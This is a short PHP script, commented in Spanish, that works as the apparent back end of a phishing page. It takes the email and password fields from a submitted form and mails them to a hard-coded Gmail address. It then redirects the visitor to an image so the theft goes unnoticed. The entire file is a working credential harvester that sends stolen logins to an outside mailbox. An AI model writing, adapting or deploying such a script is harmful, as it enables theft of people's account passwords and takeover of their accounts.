<?php
// Recuperar los datos del formulario
$email = $_POST['email'];
$pass = $_POST['pass'];

// Enviar los datos a tu correo electrónico
$to = "ismelgomez45@gmail.com";
$subject = "Datos del formulario";
$message = "Email: " . $email . "\nContraseña: " . $pass;
$headers = "From: ismelgomez45@gmail.com";

mail($to, $subject, $message, $headers);

// Redireccionar a una imagen
header("Location: ruta/a/tu/imagen.jpg");
exit;
?>
